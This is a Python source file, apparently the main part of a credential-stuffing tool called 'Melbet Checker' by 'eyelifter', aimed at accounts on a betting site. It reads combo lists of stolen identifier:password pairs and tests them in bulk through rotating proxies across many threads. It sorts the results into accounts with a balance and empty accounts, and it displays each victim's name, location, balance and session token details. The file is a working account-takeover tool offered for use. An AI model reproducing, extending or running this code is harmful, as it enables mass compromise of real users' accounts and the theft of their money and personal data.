class EyelifterRunner:
    def __init__(self, combos):
        self.eyelifter = "eyelifter"
        self.combos = combos
        self.threads = _EYELIFTER_CFG.settings["threads"]
        self.gap = _EYELIFTER_CFG.settings.get("combo_delay", 0.4)
        self.chunk = max(self.threads * 2, 100)

    def eyelifter_task(self, combo):
        if _EYELIFTER_STOP.is_set():
            return
        if self.gap > 0:
            if _EYELIFTER_STOP.wait(self.gap * (0.5 + random.random())):
                return
        if _EYELIFTER_STOP.is_set():
            return
        proxy = eyelifter_pick_proxy()
        try:
            result = eyelifter_run_with_retries(combo, proxy)
        except Exception as e:
            result = {"status": "error", "error_type": "runner_crash",
                      "message": str(e)[:120]}
        try:
            eyelifter_record(combo, result)
        except Exception:
            pass

    def eyelifter_run(self):
        inflight = set()
        ex = ThreadPoolExecutor(max_workers=self.threads)
        try:
            for i in range(0, len(self.combos), self.chunk):
                if _EYELIFTER_STOP.is_set():
                    break
                batch = self.combos[i:i + self.chunk]
                for c in batch:
                    if _EYELIFTER_STOP.is_set():
                        break
                    inflight.add(ex.submit(self.eyelifter_task, c))
                while inflight:
                    done, pending = wait(inflight, timeout=0.5,
                                         return_when=FIRST_COMPLETED)
                    for f in done:
                        inflight.discard(f)
                        try:
                            f.result(timeout=0.1)
                        except Exception:
                            pass
                    if _EYELIFTER_STOP.is_set() and not done:
                        break
            while inflight:
                done, pending = wait(inflight, timeout=0.5,
                                     return_when=FIRST_COMPLETED)
                for f in done:
                    inflight.discard(f)
                    try:
                        f.result(timeout=0.1)
                    except Exception:
                        pass
        except KeyboardInterrupt:
            _EYELIFTER_STOP.set()
        finally:
            _EYELIFTER_STOP.set()
            try:
                ex.shutdown(wait=True, cancel_futures=True)
            except TypeError:
                ex.shutdown(wait=True)


def eyelifter_ask_threads():
    print()
    print(eyelifter_color("96", f"  Threads [eyelifter]  (1-{EYELIFTER_MAX_THREADS})"))
    print(eyelifter_color("90", f"  current: {_EYELIFTER_CFG.settings['threads']}"))
    raw = input(eyelifter_color("96", "  > ")).strip()
    if not raw:
        return _EYELIFTER_CFG.settings["threads"]
    try:
        t = int(raw)
    except ValueError:
        return _EYELIFTER_CFG.settings["threads"]
    return max(1, min(EYELIFTER_MAX_THREADS, t))


def eyelifter_single_check(proxies):
    global _EYELIFTER_POOL, _EYELIFTER_BADP, _EYELIFTER_FOLDER
    _EYELIFTER_STOP.clear()

    eyelifter_section("SINGLE CHECK [eyelifter]")
    combo = input(f"{eyelifter_color('96', '[*] identifier:password > ')}").strip()
    if ":" not in combo:
        eyelifter_log("❌", "ERROR", "INPUT", "invalid format [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if not _EYELIFTER_FOLDER:
        root = os.path.join(os.path.dirname(EYELIFTER_CFG_PATH), EYELIFTER_RESULTS_DIR)
        os.makedirs(root, exist_ok=True)
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
        _EYELIFTER_FOLDER = os.path.join(root, f"Single_{ts}_{tag}")
        os.makedirs(_EYELIFTER_FOLDER, exist_ok=True)

    proxy = None
    if proxies:
        if not _EYELIFTER_POOL:
            _EYELIFTER_POOL = list(proxies)
            _EYELIFTER_BADP = set()
        proxy = eyelifter_pick_proxy()

    eyelifter_log("🔍", "STEP", "CHECK",
                  f"checking {combo.split(':')[0]} [eyelifter]")
    start = time.time()
    result = eyelifter_run_with_retries(combo, proxy)
    el = time.time() - start

    st = result.get("status")
    if st == "ok":
        verdict, enr = eyelifter_classify(result, _EYELIFTER_CFG)
        vlabel = {"hit": "💰 HIT (balance)",
                  "free": "🆓 FREE (empty balance)"}.get(verdict, "?")
        jwt = enr.get("jwt") or {}
        rows = [
            ("Status", vlabel),
            ("Identifier", enr["identifier"]),
            ("Password", enr["password"]),
            ("User ID", enr["user_id"]),
            ("Full Name", enr["full_name"]),
            ("Country", enr["country"]),
            ("Region", enr["region"] or "-"),
            ("City", enr["city"] or "-"),
            ("Type", str(enr["type"]) if enr["type"] is not None else "-"),
            ("Balance", f"${enr['balance']:.2f}"),
            ("SR Login", (enr["sr_login"] or "-")[:24]),
            ("JWT iat",
             datetime.fromtimestamp(jwt.get("iat", 0)).strftime("%Y-%m-%d %H:%M")
             if jwt.get("iat") else "-"),
            ("JWT exp",
             datetime.fromtimestamp(jwt.get("exp", 0)).strftime("%Y-%m-%d %H:%M")
             if jwt.get("exp") else "-"),
            ("JWT sid", (jwt.get("sid") or "-")[:20]),
            ("Time", f"{el:.2f}s"),
            ("Credit", f"eyelifter · {EYELIFTER_TG_USERNAME} · {EYELIFTER_TG_CHANNEL}"),
        ]
        eyelifter_summary(rows)
        if enr.get("account"):
            print(eyelifter_color("96", "── account payload [eyelifter] ──", True))
            print(json.dumps(enr["account"], indent=2, ensure_ascii=False)[:1500])
    elif st == "bad":
        eyelifter_log("❌", "ERROR", "RESULT",
                      f"bad creds - {result.get('reason', 'invalid')} [eyelifter]")
    else:
        eyelifter_log("❌", "ERROR", "RESULT",
            f"{result.get('error_type', '')} – {result.get('message', '')} [eyelifter]")

    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] Enter to continue...')}")


def eyelifter_bulk_check(proxies):
    global _EYELIFTER_TOTAL, _EYELIFTER_HIT_F, _EYELIFTER_FREE_F
    global _EYELIFTER_BAD_F, _EYELIFTER_ERR_F, _EYELIFTER_FOLDER
    global _EYELIFTER_POOL, _EYELIFTER_BADP

    eyelifter_reset_stats()
    eyelifter_section("BULK CHECK [eyelifter]")

    path = input(f"{eyelifter_color('96', '[*] combo file > ')}").strip()
    if not path or not os.path.isfile(path):
        eyelifter_log("❌", "ERROR", "FILE", "file not found [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    combos = eyelifter_extract_combos(content)
    if not combos:
        eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos [eyelifter]")

    new_threads = eyelifter_ask_threads()
    if proxies and new_threads > len(proxies):
        eyelifter_log("⚠️", "WARN", "PROXY",
            f"{new_threads} threads vs {len(proxies)} proxies — shared [eyelifter]")
    if new_threads != _EYELIFTER_CFG.settings["threads"]:
        _EYELIFTER_CFG.settings["threads"] = new_threads
        try:
            _EYELIFTER_CFG.eyelifter_save()
        except Exception:
            pass
    eyelifter_log("⚙️", "INFO", "THREADS",
                  f"{_EYELIFTER_CFG.settings['threads']} [eyelifter]")

    root = os.path.join(os.path.dirname(EYELIFTER_CFG_PATH), EYELIFTER_RESULTS_DIR)
    os.makedirs(root, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _EYELIFTER_FOLDER = os.path.join(root, f"Session_{ts}_{tag}")
    os.makedirs(_EYELIFTER_FOLDER, exist_ok=True)

    try:
        (_EYELIFTER_HIT_F, _EYELIFTER_FREE_F,
         _EYELIFTER_BAD_F, _EYELIFTER_ERR_F) = eyelifter_open_files(_EYELIFTER_FOLDER)
    except Exception as e:
        eyelifter_log("❌", "ERROR", "OPEN", f"files: {e} [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    header = (f"# Melbet Checker by eyelifter - {datetime.now().isoformat()}\n"
              f"# Seal: {EYELIFTER_SEAL_TEXT}\n"
              f"# Credit: eyelifter | {EYELIFTER_TG_USERNAME} | {EYELIFTER_TG_CHANNEL}\n"
              f"# Debug: {_EYELIFTER_CFG.settings.get('debug', False)}\n\n")
    for fh in (_EYELIFTER_HIT_F, _EYELIFTER_FREE_F,
               _EYELIFTER_BAD_F, _EYELIFTER_ERR_F):
        fh.write(header)

    _EYELIFTER_TOTAL = len(combos)
    eyelifter_log("📊", "INFO", "FILE", f"loaded {_EYELIFTER_TOTAL} [eyelifter]")

    if proxies:
        _EYELIFTER_POOL = list(proxies)
        _EYELIFTER_BADP = set()
        eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} loaded [eyelifter]")
    else:
        _EYELIFTER_POOL = []
        _EYELIFTER_BADP = set()
        eyelifter_log("⚠️", "WARN", "PROXY", "direct connection [eyelifter]")

    _EYELIFTER_STOP.clear()
    eyelifter_log("🚀", "INFO", "START",
        f"firing {_EYELIFTER_TOTAL} combos across "
        f"{_EYELIFTER_CFG.settings['threads']} threads "
        f"| {EYELIFTER_TG_USERNAME} | {EYELIFTER_TG_CHANNEL} [eyelifter]")

    try:
        EyelifterRunner(combos).eyelifter_run()
    except KeyboardInterrupt:
        _EYELIFTER_STOP.set()
        eyelifter_log("🛑", "WARN", "STOP", "stopping... [eyelifter]")
    except Exception as e:
        eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]} [eyelifter]")
    finally:
        _EYELIFTER_STOP.set()
        time.sleep(0.3)
        for fh in (_EYELIFTER_HIT_F, _EYELIFTER_FREE_F,
                   _EYELIFTER_BAD_F, _EYELIFTER_ERR_F):
            try:
                fh.close()
            except Exception:
                pass

    with _EYELIFTER_LK:
        snap = dict(_EYELIFTER_ST)

    for base, key in (
        ("mel_hits.txt", "hit"),
        ("mel_free.txt", "free"),
        ("mel_bad.txt", "bad"),
        ("mel_errors.txt", "errors"),
    ):
        old = os.path.join(_EYELIFTER_FOLDER, base)
        new = os.path.join(_EYELIFTER_FOLDER, base.replace(".txt", f"_{snap[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    eyelifter_log("💾", "INFO", "SAVE", f"results → {_EYELIFTER_FOLDER} [eyelifter]")
    eyelifter_divider()
    el = time.time() - _EYELIFTER_START
    eyelifter_summary([
        ("Total", _EYELIFTER_TOTAL),
        ("HIT", snap["hit"]),
        ("FREE", snap["free"]),
        ("Bad creds", snap["bad"]),
        ("Errors", snap["errors"]),
        ("Rate limited", snap["rl"]),
        ("Proxy fails", snap["pfails"]),
        ("Time", f"{el:.1f}s"),
        ("Speed", f"{_EYELIFTER_TOTAL / max(el, 0.001):.2f} combo/s"),
        ("Folder", _EYELIFTER_FOLDER),
        ("Credit", f"eyelifter · {EYELIFTER_TG_USERNAME} · {EYELIFTER_TG_CHANNEL}"),
    ])
    if sys.stdin.isatty():
        input(f"{eyelifter_color('93', '[*] Enter to continue...')}")


def eyelifter_settings_menu():
    eyelifter_section("SETTINGS [eyelifter]")
    s = _EYELIFTER_CFG.settings
    print(f"  [1]  Threads:               {s['threads']}  (1-{EYELIFTER_MAX_THREADS})")
    print(f"  [2]  Timeout:               {s['timeout']}s")
    print(f"  [3]  Retries:               {s['retries']}  (0-5)")
    print(f"  [4]  Combo Delay:           {s['combo_delay']}s")
    print(f"  [5]  Proxies File:          {s['proxies_file']}")
    print(f"  [6]  Skip Proxy Test:       {s['skip_proxy_test']}")
    print(f"  [7]  Rate-limit Delay:      {s['rate_limit_delay']}s")
    print(f"  [8]  Debug:                 {s['debug']}")
    print(f"  [0]  Back")

    ch = input(f"{eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False
    try:
        if ch == "1":
            s["threads"] = max(1, min(EYELIFTER_MAX_THREADS, int(input("Threads: "))))
            changed = True
        elif ch == "2":
            s["timeout"] = max(5, min(120, int(input("Timeout: "))))
            changed = True
        elif ch == "3":
            s["retries"] = max(0, min(5, int(input("Retries: "))))
            changed = True
        elif ch == "4":
            s["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay: "))))
            changed = True
        elif ch == "5":
            v = input("Proxies file: ").strip()
            if v:
                s["proxies_file"] = v
                changed = True
        elif ch == "6":
            s["skip_proxy_test"] = not s["skip_proxy_test"]
            changed = True
        elif ch == "7":
            s["rate_limit_delay"] = max(1, min(120, int(input("Rate-limit delay: "))))
            changed = True
        elif ch == "8":
            s["debug"] = not s["debug"]
            changed = True
        elif ch == "0":
            return
    except (ValueError, TypeError):
        eyelifter_log("❌", "ERROR", "CONFIG", "invalid [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if changed:
        try:
            _EYELIFTER_CFG.eyelifter_save()
            eyelifter_log("💾", "INFO", "CONFIG", "saved [eyelifter]")
        except Exception as e:
            eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e} [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")


def eyelifter_open_channel():
    try:
        for cmd in ("termux-open-url", "xdg-open", "open"):
            if subprocess.run(["which", cmd], capture_output=True).returncode == 0:
                subprocess.Popen(
                    [cmd, f"https://t.me/{EYELIFTER_TG_CHANNEL.lstrip('@')}"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL, start_new_session=True,
                    close_fds=True)
                return
    except Exception:
        pass


def eyelifter_main():
    eyelifter_verify("main")
    if _EYELIFTER_CFG.settings.get("open_channel_on_launch", True):
        threading.Thread(target=eyelifter_open_channel, daemon=True).start()

    eyelifter_banner(EYELIFTER_TOOL_NAME, "Melbet Account Checker")
    eyelifter_log("📣", "INFO", "CREDIT",
                  f"eyelifter · {EYELIFTER_TG_USERNAME} · {EYELIFTER_TG_CHANNEL} [eyelifter]")
    eyelifter_log("🐛", "INFO", "DEBUG",
                  f"{'ON' if _EYELIFTER_CFG.settings.get('debug') else 'OFF'} [eyelifter]")

    proxy_file = os.path.join(
        os.path.dirname(EYELIFTER_CFG_PATH),
        _EYELIFTER_CFG.settings.get("proxies_file", "proxies.txt"))
    proxies = eyelifter_load_proxies(proxy_file)
    if proxies and not _EYELIFTER_CFG.settings.get("skip_proxy_test", False):
        proxies = eyelifter_filter_proxies(proxies)
        eyelifter_log("✅", "INFO", "PROXY",
                      f"{len(proxies)} live [eyelifter]")

    while True:
        eyelifter_verify("menu")
        eyelifter_section(f"MAIN MENU · {EYELIFTER_TG_USERNAME} · {EYELIFTER_TG_CHANNEL} [eyelifter]")
        if proxies:
            eyelifter_log("🌐", "INFO", "PROXY",
                          f"{len(proxies)} proxies [eyelifter]")
        else:
            eyelifter_log("⚠️", "WARN", "PROXY", "direct [eyelifter]")
        print("[1] Single check")
        print("[2] Bulk check")
        print("[3] Settings")
        print("[4] Exit")
        ch = input(f"{eyelifter_color('93', '[*] Select: ')}").strip()

        if ch == "1":
            eyelifter_single_check(proxies)
        elif ch == "2":
            _EYELIFTER_STOP.clear()
            eyelifter_bulk_check(proxies)
        elif ch == "3":
            eyelifter_settings_menu()
            proxies = eyelifter_load_proxies(proxy_file)
            if proxies and not _EYELIFTER_CFG.settings.get("skip_proxy_test", False):
                proxies = eyelifter_filter_proxies(proxies)
        elif ch == "4":
            print("Exiting...")
            break
        else:
            eyelifter_log("❌", "ERROR", "INPUT", "invalid choice [eyelifter]")


if __name__ == "__main__":
    try:
        eyelifter_main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\nExiting...")
    except Exception as e:
        print(f"[FATAL] {type(e).__name__}: {e}")